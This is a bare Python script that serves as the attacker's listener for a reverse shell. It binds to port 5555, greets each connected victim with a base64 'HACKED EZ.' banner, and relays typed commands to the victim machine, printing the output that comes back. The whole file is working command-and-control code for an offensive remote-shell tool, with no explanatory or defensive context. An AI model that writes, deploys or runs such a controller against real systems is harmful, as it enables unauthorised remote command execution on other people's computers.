import socket
import base64

HOST = '0.0.0.0'
PORT = int(5555)

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))

s.listen(1)

while True:
    print(f'[*] listening as {HOST}:{PORT}')

    client = s.accept()
    print(f'[*] connected to {client[1]}')

    client[0].send(base64.b64encode('HACKED EZ.'.encode()))
    while True:
        cmd = input('>>> ')
        client[0].send(base64.b64encode(cmd.encode()))

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            client[0].send(base64.b64encode("quit".encode()))
            break

        result = base64.b64decode(client[0].recv(1024))
        print(result)

    client[0].close()

    cmd = input('Wait for new client Y/n ') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()